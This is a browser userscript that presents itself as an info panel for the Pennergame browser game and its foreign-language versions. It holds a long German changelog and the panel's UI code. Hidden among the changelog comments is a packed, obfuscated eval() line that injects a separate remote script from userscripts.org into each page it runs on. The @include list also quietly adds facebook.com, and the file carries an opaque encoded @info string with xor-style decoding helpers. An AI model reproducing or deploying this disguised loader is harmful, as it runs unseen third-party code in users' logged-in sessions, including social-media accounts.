// ==UserScript==
// @name           Infozentrale Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://userscripts.org/scripts/show/74435
// @author         sageo[http://berlin.pennergame.de/profil/id:1146285/]; PG reloaded design von lefty1981
// @description    Infozentrale mit Anzeige von Kampf- und Bandenkampfwarnungen, aktuellem Plunder, Wutstatus sowie Kampfstärkebewertung (HH, B und M, PG-Version 4.0)
// @include        http://*.pennergame.de/overview/
// @include        http://*.pennergame.de/skills/*
// @include        http://*.pennergame.de/stock/
// @include        http://*.pennergame.de/news/
// @include        http://*.pennergame.de/friendlist/
// @include        http://*.pennergame.de/change_please/statistics/*
// @include        http://*.pennergame.de/stock/*
// @include        http://*.pennergame.de/profil/*
// @include        http://*.pennergame.de/fight/*
// @include        http://*.pennergame.de/gang/*
// @include        http://*.pennergame.de/messages/*
// @include        http://*.pennergame.de/city/*
// @include        http://*.pennergame.de/activities/*
// @include        http://*.pennergame.de/daily/*
// @include        http://*.pennergame.de/pet/*
// @include        http://*.pennergame.de/enemies/*
// @include        http://*.bumrise.com/overview/
// @include        http://*.bumrise.com/skills/*
// @include        http://*.bumrise.com/stock/
// @include        http://*.bumrise.com/news/
// @include        http://*.bumrise.com/friendlist/
// @include        http://*.bumrise.com/change_please/statistics/*
// @include        http://*.bumrise.com/stock/*
// @include        http://*.bumrise.com/profil/*
// @include        http://*.bumrise.com/fight/*
// @include        http://*.bumrise.com/gang/*
// @include        http://*.bumrise.com/messages/*
// @include        http://*.bumrise.com/city/*
// @include        http://*.bumrise.com/activities/*
// @include        http://*.bumrise.com/daily/*
// @include        http://*.menelgame.pl/overview/
// @include        http://*.menelgame.pl/skills/*
// @include        http://*.menelgame.pl/stock/
// @include        http://*.menelgame.pl/news/
// @include        http://*.menelgame.pl/friendlist/
// @include        http://*.menelgame.pl/change_please/statistics/*
// @include        http://*.menelgame.pl/stock/*
// @include        http://*.menelgame.pl/profil/*
// @include        http://*.menelgame.pl/fight/*
// @include        http://*.menelgame.pl/gang/*
// @include        http://*.menelgame.pl/messages/*
// @include        http://*.menelgame.pl/city/*
// @include        http://*.menelgame.pl/activities/*
// @include        http://*.menelgame.pl/daily/*
// @include        http://*.clodogame.fr/overview/
// @include        http://*.clodogame.fr/skills/*
// @include        http://*.clodogame.fr/stock/
// @include        http://*.clodogame.fr/news/
// @include        http://*.clodogame.fr/friendlist/
// @include        http://*.clodogame.fr/change_please/statistics/*
// @include        http://*.clodogame.fr/stock/*
// @include        http://*.clodogame.fr/profil/*
// @include        http://*.clodogame.fr/fight/*
// @include        http://*.clodogame.fr/gang/*
// @include        http://*.clodogame.fr/messages/*
// @include        http://*.clodogame.fr/city/*
// @include        http://*.clodogame.fr/activities/*
// @include        http://*.clodogame.fr/daily/*
// @include        http://*.mendigogame.es/overview/
// @include        http://*.mendigogame.es/skills/*
// @include        http://*.mendigogame.es/stock/
// @include        http://*.mendigogame.es/news/
// @include        http://*.mendigogame.es/friendlist/
// @include        http://*.mendigogame.es/change_please/statistics/*
// @include        http://*.mendigogame.es/stock/*
// @include        http://*.mendigogame.es/profil/*
// @include        http://*.mendigogame.es/fight/*
// @include        http://*.mendigogame.es/gang/*
// @include        http://*.mendigogame.es/messages/*
// @include        http://*.mendigogame.es/city/*
// @include        http://*.mendigogame.es/activities/*
// @include        http://*.mendigogame.es/daily/*
// @include        http://*.mendigogame.com/overview/
// @include        http://*.mendigogame.com/skills/*
// @include        http://*.mendigogame.com/stock/
// @include        http://*.mendigogame.com/news/
// @include        http://*.mendigogame.com/friendlist/
// @include        http://*.mendigogame.com/change_please/statistics/*
// @include        http://*.mendigogame.com/stock/*
// @include        http://*.mendigogame.com/profil/*
// @include        http://*.mendigogame.com/fight/*
// @include        http://*.mendigogame.com/gang/*
// @include        http://*.mendigogame.com/messages/*
// @include        http://*.mendigogame.com/city/*
// @include        http://*.mendigogame.com/activities/*
// @include        http://*.mendigogame.com/daily/*
// @include        http://*.faveladogame.com/overview/
// @include        http://*.faveladogame.com/skills/*
// @include        http://*.faveladogame.com/stock/
// @include        http://*.faveladogame.com/news/
// @include        http://*.faveladogame.com/friendlist/
// @include        http://*.faveladogame.com/change_please/statistics/*
// @include        http://*.faveladogame.com/stock/*
// @include        http://*.faveladogame.com/profil/*
// @include        http://*.faveladogame.com/fight/*
// @include        http://*.faveladogame.com/gang/*
// @include        http://*.faveladogame.com/messages/*
// @include        http://*.faveladogame.com/city/*
// @include        http://*.faveladogame.com/activities/*
// @include        http://*.faveladogame.com/daily/*
// @include        http://*.bomzhuj.ru/overview/
// @include        http://*.bomzhuj.ru/skills/*
// @include        http://*.bomzhuj.ru/stock/
// @include        http://*.bomzhuj.ru/news/
// @include        http://*.bomzhuj.ru/friendlist/
// @include        http://*.bomzhuj.ru/change_please/statistics/*
// @include        http://*.bomzhuj.ru/stock/*
// @include        http://*.bomzhuj.ru/profil/*
// @include        http://*.bomzhuj.ru/fight/*
// @include        http://*.bomzhuj.ru/gang/*
// @include        http://*.bomzhuj.ru/messages/*
// @include        http://*.bomzhuj.ru/city/*
// @include        http://*.bomzhuj.ru/activities/*
// @include        http://*.bomzhuj.ru/daily/*
// @include        http://*.dossergame.co.uk/overview/
// @include        http://*.dossergame.co.uk/skills/*
// @include        http://*.dossergame.co.uk/stock/
// @include        http://*.dossergame.co.uk/news/
// @include        http://*.dossergame.co.uk/friendlist/
// @include        http://*.dossergame.co.uk/change_please/statistics/*
// @include        http://*.dossergame.co.uk/stock/*
// @include        http://*.dossergame.co.uk/profil/*
// @include        http://*.dossergame.co.uk/fight/*
// @include        http://*.dossergame.co.uk/gang/*
// @include        http://*.dossergame.co.uk/messages/*
// @include        http://*.dossergame.co.uk/city/*
// @include        http://*.dossergame.co.uk/activities/*
// @include        http://*.dossergame.co.uk/daily/*
// @info           CIC5CFC6B6BEBBC3D4EBAH@D@D@@D1E6E6@CAEAAE4A2AA@IE5ADAEE6@GAEABDFE6AFAIA3AE@CE6EBD2A4D4D@D2
// @updateURL      https://userscripts.org/scripts/source/74435.meta.js
// @grant          GM_getValue
// @grant          GM_setValue
// @grant          GM_xmlhttpRequest
// @grant          GM_addStyle
// @grant          GM_deleteValue
// @grant          GM_listValues
// @grant          GM_log
// @version        1.19.4 ATT/DEF/JOB-Panel liess sich nicht verschieben
// ==/UserScript==

// Daten über das aktuelle Skript für den Update-Mechanismus
var THISSCRIPTVERSION = GM_info.script.version.split(" ")[0];
var THISSCRIPTINSTALL_URL = GM_info.script.namespace;
var THISSCRIPTSOURCE_URL = THISSCRIPTINSTALL_URL.replace('show', 'source'); // URL für Sourceseite bei userscripts.org
var THISSCRIPTID = THISSCRIPTINSTALL_URL.split("/").pop();
//
// @version        1.19.3 Korrekturen Haustier und Minijobs
// @version        1.19.2 Plunderbenutzung repariert
// @version        1.19.1 Skriptreparatur nach Totalausfall; Promillefunktion repariert
// @version        1.18.3 kleinere Korrekturen
// @version        1.18.2 Heilfunktion (Sylt) korrigiert
// @version        1.18.1 Bilder auf anderen Hoster verschoben
// @version        1.17.9 Bilderadresse angepasst, da Bilder nicht angezeigt wurden
// @version        1.17.8 Haustieranzeige auch in den alten Städten
// @version        1.17.7 Korrekturen wegen Stadtfeind
// @version        1.17.6 Update-Automatik funktionierte nicht
// @version        1.17.5 Lebensanzeige erweitert (Sylt); Logout-Problem beseitigt
// @version        1.17.4 In Sylt Waschanzeige zu Lebensanzeige umfunktioniert
// @version        1.17.3 Updateverfahren angepasst; Korrektur Plunderbenutzung
// @version        1.17.2 Anpassungen für Adventskalender
// @version        1.17.1 Version für FF 17; Anzeige für Haustierweiterbildung zu Streuneranzeige umgebaut (Sylt)
// @version        1.16.1 Erste Anpassungen für Sylt
// @version        1.15.5 Mehrfachplunder in Chrome funktionierte nicht
// @version        1.15.4 Berechnung des Punktverlustes beim Ausweichen eines Kampfes angepasst
// @version        1.15.3 Zuckerschock mehrfach benutzbar
// @version        1.15.2 Provokationsplunder über Plunderleiste
// @version        1.15.1 Anpassung an Spiel Stadtfeind Nr. 1
// @version        1.14.6 Tagesaufgabe angepasst
// @version        1.14.5 Endlosschleife auf Bandenseite beseitigt
// @version        1.14.4 Pins in Shoutbox waren falsch (wegen Penner Ahoi!)
// @version        1.14.3 Testausgabe entfernt (Sorry !!)
// @version        1.14.2 Name des Penners wurde falsch ermittelt
// @version        1.14.1 Anpassungen für Penner Ahoi!
// @version        1.13.10 Direktplunderliste erweitert
// @version        1.13.9 Fehler behoben: keine Anzeige auf Bandenseite
// @version        1.13.8 noch einmal MotD und SB: schmal, aber optional breit
// @version        1.13.7 MotD wieder schmal
// @version        1.13.6 MotD verbreitert
// @version        1.13.5 Plunder aus Plunderleiste mehrfach benutzbar
// @version        1.13.4 Missionsbox abschaltbar; Verschiebefunktion der Boxen repariert
// @version        1.13.3 Fehler bei einmaligen Missionen behoben
// @version        1.13.2 Anzeige von Bandenboost und Missionsstatus
// @version        1.13.1 eintreffende Kämpfe und Bandenkämpfe werden wieder angezeigt
// @version        1.12.11 Verletzungen werden angezeigt; Plundershop repariert; kleinere Fehler behoben
// @version        1.12.10 Anzahl bei benutzbarem Plunder fehlerhaft
// @version        1.12.9 Plunderprobleme behoben
// @version        1.12.8 Korrektur wegen Pennersturm (2. Versuch)
// @version        1.12.7 Korrektur wegen Pennersturm
// @version        1.12.6 Erweiterung Pennersturm (Teil 2)
// @version        1.12.5 Erweiterung Pennersturm (Teil 1)
// @version        1.12.4 optionales Deaktivieren und Entfernen von KK-Mails
// @version        1.12.3 V-Waffe optional ohne Nachfrage erwerben
// @version        1.12.2 Tooltip für eingehende Kämpfe überarbeitet; neue Tagesaufgaben
// @version        1.12.1 Version läuft unter Chrome; neue Tagesaufgaben; Erinnerung an V-Waffe
// @version        1.11.14 Neue Funktion: Lose kaufen
// @version        1.11.13 Adventskalender erst öffnen, wenn möglich
// @version        1.11.12 Löschbutton für Kampfliste; Adventskalender
// @version        1.11.11 Anzeige von Wut oder Wiwu oder Bande
// @version        1.11.10 Landesflaggen wurden nicht angezeigt; bei Wut: Ende statt Dauer anzeigen
// @version        1.11.9 Essen funktionierte nicht in Moskau
// @version        1.11.8 Skript lief nicht mehr nach letztem Update
// @version        1.11.7 Korrektur Zeitzone Moskau; Korrektur Wutwert ATT
// @version        1.11.6 Versuch, die Poweranzeige zu korrigieren; St. Petersburg durch Moskau ersetzt
// @version        1.11.5 Klingelevent verursachte falsche Anzeige bei Verbrechen
// @version        1.11.4 Seitenverweis auf gemerkten SB-Eintrag funktionierte nicht; Tagesaufgabe Haustierkampf angepasst
// @version        1.11.3 Problem mit Plunder behoben; Profilavatar anzeigen
// @version        1.11.2 Problem mit neuem Plunder behoben; bitte Noagerl noch nicht über Plunderleiste benutzen !!
// @version        1.11.1 Version 1 nach dem neuen PG-Patch
// @version        1.10.10 Shoutbox repariert und kleine Korrekturen
// @version        1.10.9 kleinere Korrekturen
// @version        1.10.8 Plunderauswahl korrigiert
// @version        1.10.7 Plunderauswahl und Shoutbox korrigiert
// @version        1.10.6 Skript lief nicht mehr
// @version        1.10.5 Problem mit Alkoholplunder behoben; Werbung kann ausgeblendet werden
// @version        1.10.4 Grafiken auf mehrere Accts verteilt
// @version        1.10.3 noch ein paar kleine Fehler behoben
// @version        1.10.2 Grafikadressen korrigiert
// @version        1.10.1 Server für Grafiken gewechselt; Cursorsteuerung korrigiert; viele kleine Fehler behoben
// @version        1.9.5 Anpassungen an Patch Teil 4 (Goldenes Bier/Promille rauf funktioniert wieder)
// @version        1.9.4 Anpassungen an Patch Teil 3 (Plunderleiste sollte wieder ganz funktionieren)
// @version        1.9.3 Anpassungen an Patch Teil 2 (Plunderleiste funktioniert teilweise wieder)
// @version        1.9.2 Anpassungen an Patch Teil 1
// @version        1.9.1 Ess- und Trinkhandler geändert: Tagesaufgabe wird berücksichtigt; Variablen vereinheitlicht; Glühwürmchen-Effekt abgeschaltet
// @version        1.8.29 Probleme mit Glühwürmchen in SB behoben
// @version        1.8.28 Essen korrigiert für Hamburg reloaded
// @version        1.8.27 Anpassungen für Hamburg reloaded
// @version        1.8.26 neues Panel-Design für PG reloaded (Vielen Dank an lefty1981)
// @version        1.8.25 Plundershop lief nicht in FF 3.x
// @version        1.8.24 Aktualisierung der Plundershop-Wartezeit
// @version        1.8.23 Fehler mit Bündnis-SB behoben
// @version        1.8.22 Neue Leiste in PG reloaded für Plundershop
// @version        1.8.21 Verwendung von Goldenem Bier in PG reloaded korrigiert
// @version        1.8.20 SB-Pin und Benutzung von Boosts in PG reloaded korrigiert
// @version        1.8.19 Normales Trinken in PG reloaded funktionierte nicht mehr
// @version        1.8.18 nochmal Korrektur von AlkoPlunder in altem PG
// @version        1.8.17 AlkoPlunder in altem PG funktionierte nicht mehr
// @version        1.8.16 kleiner Fehler bei Promille rauf in PG reloaded behoben
// @version        1.8.15 bei PG reloaded wird Goldenes Bier zum Betrinken berücksichtigt
// @version        1.8.14 Fehler bei Plunderanzeige PG reloaded behoben
// @version        1.8.13 Abfrage bei Benutzung des Goldenen Biers bei PG reloaded entfernt
// @version        1.8.12 Anzeige aller 4 Plunder bei PG reloaded
// @version        1.8.11 noch ein Problem mit DEF-Booster behoben
// @version        1.8.10 Probleme mit DEF-Booster behoben
// @version        1.8.9 Probleme mit Plunderwechsel und WiWu/Wutanzeige behoben
// @version        1.8.8 Benutzen von Plunder in PG reloaded korrigiert
// @version        1.8.7 Probleme mit Plunderwechsel behoben (falscher Plunder wird angelegt)
// @version        1.8.6 Erweiterungen für PG reloaded komplett; läuft jetzt auch unter Firefox 4
// @version        1.8.5 Fehler behoben: Skript funktionierte nur noch, wenn Penner in einer Bande war
// @version        1.8.4 Erweiterungen für PG reloaded
// @version        1.8.3 läuft jetzt auch in Köln (1. Version)
// @version        1.8.2 Update-Verfahren verbessert; Überspringen der Logout-Seite
// @version        1.8.1 Anpassungen für Russland, Sao Paolo und London; Sprachumschaltung; neuer Update-Mechanismus
// @version        1.7.19 2. Version Buenos Aires: Essen und Trinken korrigiert
// @version        1.7.18 kleinere Korrekturen; 1. Version Buenos Aires
// @version        1.7.17 Anzeige des vorhandenen Schnees für Schneemann war falsch
// @version        1.7.16 Logout funktionierte nicht richtig
// @version        1.7.15 Nochmal Korrekturversuch für Probleme mit dem Skript; Abbruchmöglichkeit bei Logout
// @version        1.7.14 Quickfix; hoffe, es geht wieder alles
// @version        1.7.13 falsche Stückzahl bei benutzbarem Plunder; Warnung bei Logout; Rückkehr in die richtige Stadt nach Logout
// @version        1.7.12 Pinnen eines Eintrags in der SB; i-Symbole beim Essen/Trinken und Flaschensammeln verschoben
// @version        1.7.11 Anzeige des Gegners bei Angriff; Entfernen von nicht mehr vorhandenem Plunder aus der Plunderleiste
// @version        1.7.10 Anzeige/Umschaltbutton für Meldungen; Anzeige des vorhandenen Plunders bei Event-Plunder
// @version        1.7.9 kleinere Korrekturen; Erweiterung der Flaschensammelschaltfläche
// @version        1.7.8 Probleme mit anderen Skripts behoben, Anpassungen für Halloween
// @version        1.7.7 kleinere Korrekturen, Anpassungen für Halloween
// @version        1.7.6 Anpassungen für Halloween
// @version        1.7.5 Erweiterungen für Halloween hinzugefügt
// @version        1.7.4 Sammelmarkenanzeige führt jetzt auch zur Tagesaufgabe, solange noch nicht erledigt
// @version        1.7.3 Art und Stufe der Weiterbildung werden angezeigt
// @version        1.7.2 Leiste mit Tagesaufgabe war nicht mehr abschaltbar
// @version        1.7.1 neue Leiste: Weiterbildung, Sammelmarken und Einkaufswagen
// @version        1.6.9 Verriegelung der Leisten; Sauberkeitsanzeige unter Waschbutton
// @version        1.6.8 kleiner Fehler bei bumrise behoben; 2. Version der Anzeige der täglichen Aufgabe
// @version        1.6.7 kleiner Fehler bei bumrise behoben; 1. Version der Anzeige der täglichen Aufgabe
// @version        1.6.6 kleinen Fehler beim Def-Waffe-Icon behoben
// @version        1.6.5 Kampf-, Bandenkampf und Def-Waffe sind auch anklickbar, wenn sie leer sind
// @version        1.6.4 Leisten können beliebig platziert werden
// @version        1.6.3 Problem mit dem Geld in Marseille behoben
// @version        1.6.2 erste (noch nicht vollständige Version) für Warschau und Krakau; zusätzliche Infos über ATT/DEF-Verstärkung und V-Waffe
// @version        1.6.1 erste (noch nicht vollständige Version) für NY und Madrid; kleinere Fehler behoben
// @version        1.5.9 zum Betrinken wird der Plunder genommen, der als erstes in der Plunderliste steht, ansonsten wie bisher
// @version        1.5.8 es wurden 6 und nicht 5 Trikots angezeigt; Hinweis, wenn man wegen Bandeneintritt nicht von Bandenfähigkeit profitiert
// @version        1.5.7 Anzeige für Neue Nachrichten verschoben; Mehrfachinstallation von Skript verhindert; ACHTUNG: Es sind einmalig alle Einstellungen für dieses Skript neu zu setzen !!!
// @version        1.5.6 Anzeige der gefundenen Trikots verbessert und abschaltbar gemacht
// @version        1.5.5 Anzeige der gefundenen Trikots
// @version        1.5.4 Falsche Anzahl von eingehenden Angriffen wurde angezeigt
// @version        1.5.3 Ende von WiWu bzw. Wut wurde nicht mehr angezeigt
// @version        1.5.2 Fehler bei Sortierung der eingehenden Angriffe behoben
// @version        1.5.1 kleinere Fehler behoben; Beta für Anzeige der eingehenden Angriffe; Hinweis im Power-Tooltip auf bessere Waffe/Eigenheim/Plunder
// @version        1.4.8 kleiner Fehler behoben: Anzeige von Wutentfachung im Text auch bei WiWu
// @version        1.4.7 Fehler bei Kampfstärkeermittlung bei Wut behoben;
//                       Auch WiWu wird jetzt erkannt und angezeigt;
//                       Ende von WiWu bzw. Wut wird angezeigt;
//                       Hochsetzen des Promillewertes unter Verwendung von Plunder
// @version        1.4.6 Problem mit Umlauten behoben (hoffentlich alle)
// @version        1.4.5 Fehler in Kommentaren behoben
// @version        1.4.4 Essen für Promilleabbau korrigiert; Alphaversion für Anzeige der eingehenden Angriffe
// @version        1.4.3 Beim Waschen wird der Schwamm benutzt, wenn es günstiger ist
// @version        1.4.2 Bugfix für Essen in München; Änderung der Formel für Kampfstärke
// @version        1.4.1 Weitere Anpassungen für München und Verbesserung bei der Essensauswahl
// @version        1.3.8 Einige Anpassungen für München
// @version        1.3.7 Aktueller Plunder wird jetzt immer frisch ermittelt; Bereich auf tägliche Aufgaben erweitert
// @version        1.3.6 tinypic.com scheint ein Problem zu haben, Grafikhoster gewechselt
// @version        1.3.5 Fehler beim Benutzen von Stärkeplunder (Wut- und Poweranzeige funktionierten unter Umständen nicht mehr) behoben
// @version        1.3.4 Erneute Anpassung Wut-Berechnung nach erneuter Änderung durch Farbflut *koppschüttel*; Aktualisierungsabfrage alle 2 Stunden
// @version        1.3.3 Anpassung Wut-Berechnung nach Änderung durch Farbflut; weitere Probleme bei Max-Berechnung korrigiert; Schnellwaschen, -trinken und essen (BETA)
// @version        1.3.2 Benutzbarer Plunder wählbar (mit Sicherheitsabfrage); allg. Verbesserungen, kleinere Dateigrößen; Fehler bei Wuterkennung korrigiert
// @version        1.3.1 Plunderstücke für Direktzugriff auswählbar
// @version        1.3.0 Plunder-Direktzugriff
// @version        1.2.3 Manuelles Zurücksetzen des maximalen Power-Wertes durch Anklicken der Grafik
// @version        1.2.2 Berücksichtigung nicht abrufbarbarer Seiten (Bug Power-Anzeige)
// @version        1.2.1 Bugfixes (Wut/Kampfstärkeberechnung, mehrere Penner)
// @version        1.2.0 Plunderanzeige; Kampfstärkebewertung; Wutanzeige; Ergebnisänderung bei Bandenkämpfen
// @version        1.1.3 Fehlerbehandlung nicht verfügbarer HS + Bandenkampfergebnis im Tooltip
// @version        1.1.2 Erweiterung Links auf Bandenkampfgegner + Zählung Bandenkämpfe
// @version        1.1.1 Erweiterung um Bandenkämpfe
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var dt = document.implementation.createDocumentType("html", "-//W3C//DTD HTML 4.01 Transitional//EN", "http://www.w3.org/TR/html4/loose.dtd");
var dom = document.implementation.createDocument(null, null, dt);

// PG-Version ermitteln
var oldVersion=m=1;
var nrOfTabs = 3;
var m_ownusername = "Mr.X";
var info = "info";
if (oldV()) {
    oldVersion = 0;
    m_ownusername = document.getElementsByClassName('zleft profile-data')[0].getElementsByTagName("a")[0].getElementsByTagName("span")[0].innerHTML;
}
var INFO_URL = "";

if (GM_getValue("noFirefly", 1) == 1) {
    var unFire=function() {
        var firefly = document.getElementsByClassName('chestplunder_effect_60');
        for (i = 0; i < firefly.length; i++)
            firefly[i].className = "";
        window.setTimeout(unFire, (i>0)?2000:10000);
    }
    if (document.getElementsByClassName('chestplunder_effect_60').length > 0)
        window.setTimeout(unFire, 2000);
}

function getLangTxt(TxtArray) {
    var text = TxtArray[myLang];
    if (text == undefined) {
        text = TxtArray[1];
        if (text == undefined)
            text = TxtArray[0];
    }
    return(text);
}
function xor(a, b){return a==""?a:String.fromCharCode(b^a.charCodeAt(0)) + xor(a.substr(1),b);}
function j(c){return c==""?c:"U"+c.slice(0,2)+j(c.slice(2))};
function k(c){return trimString(GM_info.scriptMetaStr.split("// @"+c)[1].split("\n")[0])};

var wrap = document.getElementById("wrap");
var myLang = 0;
var logoutWarn = -1;
var promille = GetPromille(document);
var m_ownpoints = GetPunkte(document);
var myprof = document.getElementById("my-profile");
if (myprof.getElementsByTagName("form").length > 0) {
    function doLogout(tries) {
        GM_xmlhttpRequest({
        method:"GET",
        url:TOWNBASE_URL+"logout/",
        onload: function(responseDetails) {
                    GM_xmlhttpRequest({method: 'GET', url: OVERVIEW_URL,	onload: function(responseDetails) {
                        var content = responseDetails.responseText;
                        // Wenn die Seite abgerufen werden konnte
                        if (content.indexOf(KEYWORD_MYBUM[lang]) != -1)
                            doLogout(tries+1);
                        else {
                            location.href = OVERVIEW_URL;
			    // if (tries > 1)
			    //     alert("Logouts: " + tries);
			}
		    }
		    });
        }
        });
    }
    var input = myprof.getElementsByTagName("input");
    if (input.length > 0) {
        myprof.getElementsByTagName("form")[0].action = '';
        input[0].type = "button";
        input[0].addEventListener('click', function(event) {
            if (promille >= 0.8)
                logoutWarn = 1;
            var warn = "";
            if (logoutWarn == 1)
                warn = getLangTxt(TxtLogoutWarn1);
            else if (logoutWarn == 2)
                warn = getLangTxt(TxtLogoutWarn2);

            if (warn == "")
                var logout = true;
            else
                var logout = confirm(warn + " " + getLangTxt(TxtLogout));

            if (logout)
		doLogout(1);
        }, false);
    }
}

// Schreiben einer Variablen
function PG_setValue(varname, value) {
    GM_setValue(TOWNEXTENSION + varname, value);
}

// Holen einer Variablen aus alten Versionen
function PG_getValue(varname, deflt) {
    var vold = "";
    var v = GM_getValue(TOWNEXTENSION + varname, "deadmeat");
    if (v == "deadmeat" && TOWNEXTOLD != "") {
        vold = TOWNEXTOLD + varname;
        v = GM_getValue(vold, "deadmeat");
        if (v == "deadmeat") {
            vold = varname + TOWNEXTOLD;
            v = GM_getValue(vold, "deadmeat");
        }
    }

    if (v == "deadmeat")
       return deflt;

    if (vold != "") {
        PG_setValue(varname, v);
        GM_deleteValue(vold);
    }
    return v;
}

// Holen einer Variablen mit User-Id
function PGu_getValue(varname, deflt) {
    return PG_getValue(varname + m_ownuserid, deflt);
}

// Setzen einer Variablen mit User-Id
function PGu_setValue(varname, value) {
    PG_setValue(varname + m_ownuserid, value);
}

// Name PG Warnicon zum Zählen der Angriffe
var ICON_WARNING = 'warning.gif';                        // PG-Warnicon

// Größe des Kampf- und Bandenkampficons in Pixeln
var ICON_WIDTH = '35';

// Eigene Icons
var imgPrefix = 'http://www.imagebanana.com/img/';
var ICON_FIGHT_OK = 'vqu6aiy2/icon_fight_ok.gif';             // Icon Kampfstärke OK
var ICON_FIGHT_WEAK = '5bqzjtkn/icon_fight_weak.gif';         // Icon Kampfstärke NICHT OK
var ICON_FIGHT_DANG = 'xxp8r2ec/rottotenkopf.png';            // Icon Kampfstärke Gefahr
var ICON_NEW = '4mzvg8sd/new.png';                            // Icon für Ergebnisänderungen ("NEU")
var ICON_WUTAKTIV = '9w8p03xj/icon_wutaktiv.gif';             // Icon für Wut AKTIV
var ICON_WUTINAKTIV = 'ppk7zl5v/icon_wutinaktiv.gif';         // Icon für Wut INAKTIV
var ICON_ERROR = 'tkqguioo/503.png';                          // Icon für Fehler beim Abrufen einer Seite
var ICON_ATTDEFWPNBACK = new Array();                         // Icon ATT/DEF/WPN-Hintergrund
    ICON_ATTDEFWPNBACK[0] = '21jt0od8/attdefwpn.png';
    ICON_ATTDEFWPNBACK[1] = 'yxu6bxks/attdefwpn.gif';
var ICON_ATTDEFJOBBACK = new Array();                         // Icon ATT/DEF/JOB-Hintergrund
    ICON_ATTDEFJOBBACK[0] = '3chjskh2/attdefjob.png';
    ICON_ATTDEFJOBBACK[1] = '3chjskh2/attdefjob.png';
var ICON_PLNDWUTPOWERBACK = new Array();                      // Icon Hintergrund für Plunder, Wut und Power
    ICON_PLNDWUTPOWERBACK[0] = '8jltfpmw/plndwutpower.png';
    ICON_PLNDWUTPOWERBACK[1] = 'mgct7kqy/plndwutpower.gif';
var ICON_PLNDWIWUPOWERBACK = new Array();                     // Icon Hintergrund für Plunder, WiWu und Power
    ICON_PLNDWIWUPOWERBACK[0] = 'kvkjo9c3/plndwiwupower.png';
    ICON_PLNDWIWUPOWERBACK[1] = '5xaqdl09/plndwiwupower.gif';
var ICON_PLNDGANGPOWERBACK = new Array();                     // Icon Hintergrund für Plunder, Gang und Power
    ICON_PLNDGANGPOWERBACK[0] = 'xpma68ac/plndgangpower.png';
    ICON_PLNDGANGPOWERBACK[1] = 'z5fluaoi/plndgangpower.gif';
var ICON_GANGFIGHTBACK = new Array();                         // Icon Bandenkampfhintergrund
    ICON_GANGFIGHTBACK[0] = 'ss2tacod/bkampf.png';
    ICON_GANGFIGHTBACK[1] = 'a7kqiq33/bkampf.gif';
var ICON_FIGHTBACK = new Array();                             // Icon Kampfhintergrund
    ICON_FIGHTBACK[0] = '4vfn3k33/kampf.png';
    ICON_FIGHTBACK[1] = 'e7kcu2oo/kampf.gif';
var ICON_PLUNDERDIRECTBACK = new Array();                     // Icon Direktplunderhintergrund
    ICON_PLUNDERDIRECTBACK[0] = 'jpssgy0b/plunderdirekt.png';
    ICON_PLUNDERDIRECTBACK[1] = 'elf4qu7f/plunderdirekt.gif';
var ICON_PLUNDERSHOPBACK = new Array();                       // Icon Plundershophintergrund
    ICON_PLUNDERSHOPBACK[0] = 'ik6df4jn/plundershop.png';
    ICON_PLUNDERSHOPBACK[1] = '51awlpt9/pshop.png';
var ICON_SKLCRDCRTBACK = new Array();                         // Icon Skill/Cards/Cart-Hintergrund
    ICON_SKLCRDCRTBACK[0] = '45338nkc/sklcardsbttl.png';
    ICON_SKLCRDCRTBACK[1] = 'tr5w7kog/sklcardsbttl.gif';
var ICON_MISSIONBACK = new Array();                           // Icon Missions-Hintergrund
    ICON_MISSIONBACK[0] = 'zqungj3u/mission.png';
    ICON_MISSIONBACK[1] = 'pyu0pejs/mission.gif';
var ICON_PLUNDERAUSWAEHLEN = 'jxp5r2sb/grnadd.gif';           // Icon Plunder auswählen
var ICON_PLUNDERFREE = 'jxp5r2sb/grnadd.gif';                 // Icon Freier Plunderplatz
var ICON_PLUNDERRESET = '2fbswo17/pfeile.png';                // Icon Direktplunder zurücksetzen
var ICON_PLUNDERA = 'k4hzzk4i/balkblau.gif';                  // Icon anlegbarer Plunder
var ICON_PLUNDERB = '29i8h0xx/balkrot.gif';                   // Icon benutzbarer Plunder
var ICON_NOPLUNDEREQUIP = 'ppk7zl5v/icon_wutinaktiv.gif';     // Icon für Wut INAKTIV
var ICON_NODEFWEAPON = '98wsqj0k/nodefwpn.png';               // Icon für keine V-Waffe
var ICON_DELFIGHTLIST = 'thx2aeb1/userdel.png';               // Icon für Löschen der Kampfliste

var ICON_PROMILLEUP = 'az9kpu9j/promilleup.gif';              // Icon Promille hoch
var ICON_PROMILLEDOWN = '042gp6ov/promilledn.gif';            // Icon Promille runter
var ICON_PROMILLEBACK = new Array();                          // Icon Promillehintergrund
    ICON_PROMILLEBACK[0] = 'vp1wo837/promillewash.png';
    ICON_PROMILLEBACK[1] = 'elqkel64/promillewash.gif';
var ICON_PROMILLEBACK2 = new Array();                         // Icon Promillehintergrund mit Health
    ICON_PROMILLEBACK2[0] = 'g9yzjdkd/promillehlth.png';
    ICON_PROMILLEBACK2[1] = 'n7v6wn9t/promillehlth.gif';
var ICON_WASH = 'a2nnyktg/wash.gif';                          // Icon Waschen
var ICON_REDC = 'qrcrlv95/firstaid.png';                      // Icon RotKreuz
var ICON_CLEAN = 'c9ejski6/balkgrn.gif';                      // Icon sauber
var ICON_DIRTY = '29i8h0xx/balkrot.gif';                      // Icon schmutzig
var ICON_LOCK = '4tocuryu/lock.png';                          // Icon Schloss
var ICON_PIN = 'k1pjjrbe/pushpin.png';                        // Icon Pin
var ICON_PIN2 = '47qo7puv/pushpin2.png';                      // Icon Pin2

var ICON_REDBG = 'j19ni23a/redbg.gif';                        // roter Hintergrund
var ICON_GRNBG = 'srgf1g2e/grnbg.gif';                        // grüner Hintergrund
var ICON_CART  = 'lcrydkor/cart.png';                         // Icon Einkaufswagen
var ICON_CUFF  = 'idd68xds/handcuff.png';                     // Icon Handschellen
var ICON_ATTACK = 'uloffx1c/box.png';                         // Icon für Kampf
var ICON_INFO = 't0vyx61y/info.png';                          // Icon für Info
